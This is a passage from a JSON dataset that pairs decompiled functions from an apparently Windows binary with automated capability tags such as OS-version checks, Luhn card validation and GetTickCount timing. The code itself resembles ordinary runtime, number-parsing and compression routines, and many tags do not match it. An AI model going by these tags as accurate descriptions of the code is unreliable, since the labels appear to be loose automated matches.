        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405f38(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00405f38();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405f08();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x4a6008 != NULL) {\n                (**0x4a6008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 515
    },
    "00406134": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00406134(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.004030ec();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.004054c0();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.00405c84();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.0040611c();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.00406250(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00406134();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.00406f54();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x4a6008 != NULL) {\n                    (**0x4a6008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.00402fe8();\n                return;\n            }\n            fcn.004068a0();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.004030ec();\n    }\n    return;\n}\n",
        "token_count": 558
    },
    "00406250": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __thiscall fcn.00406250(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.004054c0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.00405c84();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.0040611c();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00406250();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00406134();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00406f54();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x4a6008 != NULL) {\n                (**0x4a6008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n        do {\n            fcn.004068a0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "004417c4": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004417c4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iStack20;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x154) = puVar1;\n    *puVar1 = 0x4410d4;\n    if (param_2 == 0) {\n        iVar3 = (**(*(in_EAX + 4) + 4))();\n        piVar5 = puVar1 + 6;\n        iVar6 = 0;\n        do {\n            iVar4 = iVar6 + 1;\n            *piVar5 = iVar6 * 0x80 + iVar3;\n            piVar5 = piVar5 + 1;\n            iVar6 = iVar4;\n        } while (iVar4 < 10);\n        puVar1[0x10] = 0;\n    }\n    else {\n        iStack20 = 0;\n        iVar6 = *(in_EAX + 0x40);\n        puVar1 = puVar1 + 0x10;\n        for (; iStack20 < *(in_EAX + 0x38); iStack20 = iStack20 + 1) {\n            uVar2 = fcn.0043e4c8();\n            uVar2 = fcn.0043e4c8(uVar2);\n            uVar2 = (**(*(in_EAX + 4) + 0x14))(*(iVar6 + 0xc), uVar2);\n            *puVar1 = uVar2;\n            puVar1 = puVar1 + 1;\n            iVar6 = iVar6 + 0x54;\n        }\n    }\n    return;\n}\n",
        "token_count": 426
    },
    "00444248": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00444248(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int16_t *in_EDX;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = *in_EDX - in_ECX;\n    if (iVar4 < 0) {\n        iVar4 = -iVar4;\n    }\n    iVar5 = 0;\n    for (; iVar4 != 0; iVar4 = iVar4 >> 1) {\n        iVar5 = iVar5 + 1;\n    }\n    if (0xb < iVar5) {\n        piVar1 = *(in_EAX + 0x20);\n        *(*piVar1 + 0x14) = 6;\n        (***piVar1)();\n    }\n    iVar4 = fcn.00444170();\n    if (iVar4 == 0) {\n        uVar2 = 0;\n    }\n    else if ((iVar5 == 0) || (iVar4 = fcn.00444170(),  iVar4 != 0)) {\n        var_10h = 1;\n        var_14h = 0x4a24b4;\n        iVar4 = 0;\n        do {\n            iVar5 = in_EDX[*var_14h];\n            if (iVar5 == 0) {\n                iVar4 = iVar4 + 1;\n            }\n            else {\n                for (; 0xf < iVar4; iVar4 = iVar4 + -0x10) {\n                    iVar3 = fcn.00444170();\n                    if (iVar3 == 0) {\n                        return 0;\n                    }\n                }\n                if (iVar5 < 0) {\n                    iVar5 = -iVar5;\n                }\n                iVar4 = 1;\n                while (iVar5 = iVar5 >> 1,  iVar5 != 0) {\n                    iVar4 = iVar4 + 1;\n                }\n                if (10 < iVar4) {\n                    piVar1 = *(in_EAX + 0x20);\n                    *(*piVar1 + 0x14) = 6;\n                    (***piVar1)();\n                }\n                iVar4 = fcn.00444170();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                iVar4 = fcn.00444170();\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                iVar4 = 0;\n            }\n            var_10h = var_10h + 1;\n            var_14h = var_14h + 1;\n        } while (var_10h < 0x40);\n        if ((iVar4 < 1) || (iVar4 = fcn.00444170(),  iVar4 != 0)) {\n            uVar2 = 1;\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 714
    },
    "004445d4": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004445d4(int32_t *arg_8h, int32_t arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t in_ECX;\n    int16_t *in_EDX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = *in_EDX - in_ECX;\n    if (iVar2 < 0) {\n        iVar2 = -iVar2;\n    }\n    iVar3 = 0;\n    for (; iVar2 != 0; iVar2 = iVar2 >> 1) {\n        iVar3 = iVar3 + 1;\n    }\n    if (0xb < iVar3) {\n        *(*in_EAX + 0x14) = 6;\n        (***in_EAX)();\n    }\n    piVar1 = arg_ch + iVar3 * 4;\n    *piVar1 = *piVar1 + 1;\n    iVar2 = 0;\n    var_10h = 1;\n    var_14h = 0x4a24b4;\n    do {\n        iVar3 = in_EDX[*var_14h];\n        if (iVar3 == 0) {\n            iVar2 = iVar2 + 1;\n        }\n        else {\n            for (; 0xf < iVar2; iVar2 = iVar2 + -0x10) {\n                arg_8h[0xf0] = arg_8h[0xf0] + 1;\n            }\n            if (iVar3 < 0) {\n                iVar3 = -iVar3;\n            }\n            iVar4 = 1;\n            while (iVar3 = iVar3 >> 1,  iVar3 != 0) {\n                iVar4 = iVar4 + 1;\n            }\n            if (10 < iVar4) {\n                *(*in_EAX + 0x14) = 6;\n                (***in_EAX)();\n            }\n            arg_8h[iVar4 + iVar2 * 0x10] = arg_8h[iVar4 + iVar2 * 0x10] + 1;\n            iVar2 = 0;\n        }\n        var_10h = var_10h + 1;\n        var_14h = var_14h + 1;\n    } while (var_10h < 0x40);\n    if (0 < iVar2) {\n        *arg_8h = *arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 585
    },
    "0044a770": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a770(int32_t param_1, int32_t param_2)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iStack24;\n    uint32_t uStack20;\n    uint16_t *puStack16;\n    \n    uStack20 = 0xffffffff;\n    uVar2 = *(param_2 + 2);\n    iVar7 = 0;\n    iVar4 = 7;\n    iVar3 = 4;\n    if (uVar2 == 0) {\n        iVar4 = 0x8a;\n        iVar3 = 3;\n    }\n    *(param_2 + 6 + param_1 * 4) = 0xffff;\n    puStack16 = param_2 + 6;\n    iStack24 = 0;\n    uVar5 = uVar2;\n    if (-1 < param_1) {\n        do {\n            iVar7 = iVar7 + 1;\n            uVar6 = *puStack16;\n            if ((iVar4 <= iVar7) || (uVar6 != uVar5)) {\n                if (iVar7 < iVar3) {\n                    piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                    *piVar1 = *piVar1 + iVar7;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar7 < 0xb) {\n                        *(in_EAX + 0xabc) = *(in_EAX + 0xabc) + 1;\n                    }\n                    else {\n                        *(in_EAX + 0xac0) = *(in_EAX + 0xac0) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != uStack20) {\n                        piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(in_EAX + 0xab8) = *(in_EAX + 0xab8) + 1;\n                }\n                iVar7 = 0;\n                uStack20 = uVar5;\n                if (uVar6 == 0) {\n                    iVar4 = 0x8a;\n                    iVar3 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar4 = 6;\n                    iVar3 = 3;\n                }\n                else {\n                    iVar4 = 7;\n                    iVar3 = 4;\n                }\n            }\n            iStack24 = iStack24 + 1;\n            puStack16 = puStack16 + 2;\n            uVar5 = uVar6;\n        } while (iStack24 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0044a87c": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a87c(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iStack48;\n    uint32_t uStack44;\n    uint16_t *puStack20;\n    \n    iVar7 = 4;\n    iVar2 = 7;\n    uStack44 = 0xffffffff;\n    if (*(param_2 + 2) == 0) {\n        iVar2 = 0x8a;\n        iVar7 = 3;\n    }\n    iStack48 = 0;\n    puStack20 = param_2 + 6;\n    iVar3 = 0;\n    uVar5 = *(param_2 + 2);\n    if (-1 < param_1) {\n        do {\n            iVar4 = iVar3 + 1;\n            uVar6 = *puStack20;\n            if ((iVar2 <= iVar4) || (uVar6 != uVar5)) {\n                if (iVar4 < iVar7) {\n                    do {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        uVar8 = *(in_EAX + 0xabe);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xabc);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xabc) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 0xe) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 2U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 2U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n                        }\n                    }\n                    else {\n                        uVar8 = *(in_EAX + 0xac2);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xac0);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xac0) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 10) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -0xb << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 7;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 10U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 10U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -9;\n                        }\n                    }\n                }\n                else {\n                    if (uVar5 != uStack44) {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        iVar4 = iVar3;\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                    }\n                    uVar8 = *(in_EAX + 0xaba);\n                    if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                        uVar1 = *(in_EAX + 0xab8);\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xab8) << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                    }\n                    if (*(in_EAX + 0x16b8) < 0xf) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 2;\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 - 3U << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (iVar4 - 3U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xe;\n                    }\n                }\n                iVar4 = 0;\n                uStack44 = uVar5;\n                if (uVar6 == 0) {\n                    iVar2 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar2 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar2 = 7;\n                    iVar7 = 4;\n                }\n            }\n            iStack48 = iStack48 + 1;\n            puStack20 = puStack20 + 2;\n            iVar3 = iVar4;\n            uVar5 = uVar6;\n        } while (iStack48 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 3797
    },
    "0048aaec": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.0048aaec(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 8) {\n        fcn.004054c0();\n        return;\n    }\n    if (in_EAX == 0xd) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 0x18) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 10) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 6) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 4) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "00403eb4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403eb4(uint param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    uint8_t *in_EAX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    \n    puVar6 = in_EAX;\n    if (in_EAX == NULL) {\ncode_r0x00403f2a:\n        puVar6 = puVar6 + 1;\n    }\n    else {\n        uVar2 = 0;\n        do {\n            puVar5 = puVar6;\n            uVar3 = *puVar5;\n            puVar6 = puVar5 + 1;\n        } while (uVar3 == 0x20);\n        bVar1 = false;\n        if (uVar3 == 0x2d) {\n            bVar1 = true;\ncode_r0x00403f3a:\n            uVar3 = *puVar6;\n            puVar6 = puVar5 + 2;\n        }\n        else if (uVar3 == 0x2b) goto code_r0x00403f3a;\n        if (((uVar3 == 0x24) || (uVar3 == 0x78)) || (uVar3 == 0x58)) {\ncode_r0x00403f3f:\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n            if (uVar3 != 0) {\n                do {\n                    if (0x60 < uVar3) {\n                        uVar3 = uVar3 - 0x20;\n                    }\n                    uVar4 = uVar3 - 0x30;\n                    if (9 < uVar4) {\n                        if (5 < uVar3 + 0xbf) goto code_r0x00403f33;\n                        uVar4 = uVar3 - 0x37;\n                    }\n                    if (0xfffffff < uVar2) goto code_r0x00403f33;\n                    uVar2 = uVar2 * 0x10 + uVar4;\n                    uVar3 = *puVar6;\n                    puVar6 = puVar6 + 1;\n                } while (uVar3 != 0);\ncode_r0x00403f7c:\n                iVar7 = 0;\n                goto code_r0x00403f7f;\n            }\n            goto code_r0x00403f2a;\n        }\n        if (uVar3 != 0x30) {\n            if (uVar3 != 0) goto code_r0x00403f06;\n            goto code_r0x00403f33;\n        }\n        uVar3 = *puVar6;\n        puVar6 = puVar6 + 1;\n        if ((uVar3 == 0x78) || (uVar3 == 0x58)) goto code_r0x00403f3f;\n        while (uVar3 != 0) {\ncode_r0x00403f06:\n            if ((9 < uVar3 - 0x30) || (0xccccccc < uVar2)) goto code_r0x00403f33;\n            uVar2 = uVar2 * 10 + (uVar3 - 0x30);\n            uVar3 = *puVar6;\n            puVar6 = puVar6 + 1;\n        }\n        if (bVar1) {\n            if ((-1 < uVar2) || (0 < uVar2)) goto code_r0x00403f7c;\n        }\n        else if (-1 < uVar2) goto code_r0x00403f7c;\n    }\ncode_r0x00403f33:\n    iVar7 = puVar6 - in_EAX;\ncode_r0x00403f7f:\n    *param_2 = iVar7;\n    return;\n}\n",
        "token_count": 876
    },
    "0040c874": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0040c874(char *arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint16_t *in_ECX;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = '\\0';\n    fcn.0040c850();\n    iVar3 = *in_EDX;\n    uVar1 = 0;\n    while( true ) {\n        iVar2 = fcn.0040572c();\n        if (((iVar2 < iVar3) || (9 < *(in_EAX + -1 + iVar3) - 0x30U)) || (999 < uVar1)) break;\n        uVar1 = uVar1 * 10 + (*(in_EAX + -1 + iVar3) - 0x30);\n        iVar3 = iVar3 + 1;\n    }\n    iVar2 = *in_EDX;\n    if (iVar2 < iVar3) {\n        *arg_8h = iVar3 - *in_EDX;\n        *in_EDX = iVar3;\n        *in_ECX = uVar1;\n    }\n    return iVar2 < iVar3;\n}\n",
        "token_count": 282
    },
    "0041cde8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\nuint32_t fcn.0041cde8(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.0041e8c8();\n    return uVar1 & 0xffffff00 | uVar1 == '\\t';\n}\n",
        "token_count": 58
    },
    "00423ac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
